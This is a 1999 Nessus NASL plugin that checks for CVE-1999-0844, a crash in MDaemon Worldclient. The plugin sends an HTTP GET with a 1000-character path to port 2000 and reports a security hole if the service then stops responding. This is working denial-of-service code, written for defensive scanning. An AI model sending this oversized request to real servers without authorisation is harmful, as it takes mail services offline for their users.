#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10139);
 script_bugtraq_id(820, 823);
 script_version ("$Revision: 1.12 $");
 script_cve_id("CVE-1999-0844");
 name["english"] = "MDaemon Worldclient crash";
 name["francais"] = "Plantage de Worldclient de MDaemon";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "It was possible to crash the 
remote Worldclient, which allows the users to read
their mails remotely, by sending : 

	GET /aaaaa[...]aaa HTTP/1.0
	
	

This problem allows an attacker to prevent your
employees from reading their mails remotely.

Solution : contact your vendor for a fix.

Risk factor : High";


 desc["francais"] = "Il s'est av�r� possible de faire
planter le service Worldclient de mdaemon, utilis�
pour lire son mail � distance.

Ce probl�me permet � des pirates d'empecher
les utilisateurs de votre r�seau de lire leurs
mails correctement.

Solution : contactez votre vendeur pour un patch.

Facteur de risque : S�rieux.";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes the remote service";
 summary["francais"] = "Fait planter le service distant";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "D�ni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "httpver.nasl");
 script_require_ports(2000);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = 2000;
if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 
 soc = http_open_socket(port);
 if(soc)
 {
  data = http_get(port:port, item:crap(1000));
  send(socket:soc, data:data);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port))security_hole(port);
 }
}
